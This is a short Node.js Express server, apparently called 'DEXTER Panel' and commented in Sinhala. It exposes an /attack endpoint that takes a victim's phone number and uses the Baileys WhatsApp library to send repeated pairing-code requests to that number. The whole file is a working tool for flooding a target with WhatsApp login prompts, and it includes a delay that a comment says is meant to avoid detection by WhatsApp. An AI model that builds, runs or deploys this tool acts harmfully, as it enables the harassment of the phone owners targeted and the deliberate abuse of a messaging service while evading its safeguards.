const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8000;

app.use(express.static('public'));

app.get('/attack', async (req, res) => {
    const target = req.query.num;
    const count = parseInt(req.query.count) || 5;

    if (!target) return res.status(400).json({ error: "අංකය ඇතුළත් කරන්න!" });

    console.log(`[DEXTER] Attack request for: ${target} | Count: ${count}`);

    // ප්‍රහාරය පසුබිමෙන් පටන් ගමු
    startAttack(target, count);
    
    res.json({ status: "Success", message: `Attack started on ${target}` });
});

async function startAttack(target, count) {
    const { state } = await useMultiFileAuthState('temp_session');
    
    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false
    });

    for (let i = 0; i < count; i++) {
        try {
            // Pairing code ඉල්ලීම
            await sock.requestPairingCode(target.replace(/[^0-9]/g, ''));
            console.log(`[DEXTER] ${i+1} Request sent to ${target}`);
            
            // වැදගත්: වට්සැප් එකට අහු නොවෙන්න පොඩි වෙලාවක් ඉමු
            await delay(5000); 
        } catch (e) {
            console.log(`[ERROR] ${e.message}`);
        }
    }
}

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => console.log(`DEXTER Panel Live on port ${PORT}`));
